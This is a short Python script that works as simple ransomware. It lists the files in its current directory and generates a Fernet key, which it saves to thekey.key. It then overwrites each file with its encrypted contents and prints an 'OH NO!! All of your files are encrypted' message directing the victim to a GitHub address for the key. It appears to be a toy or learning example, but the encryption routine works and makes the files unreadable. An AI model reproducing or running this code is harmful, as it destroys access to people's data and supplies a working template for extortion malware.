#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's list some of the files

files = []

for file in os.listdir():
	if file == "main.py" or  file == "unlocker.py" or file == "thekey.key" or file == "README.txt":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


# Making a key to decrypt

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)


# Time to encrypt some files!!

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("OH NO!! All of your files are encrypted (IN THIS DIR)!! Please download the key at https://github/Network1013!")
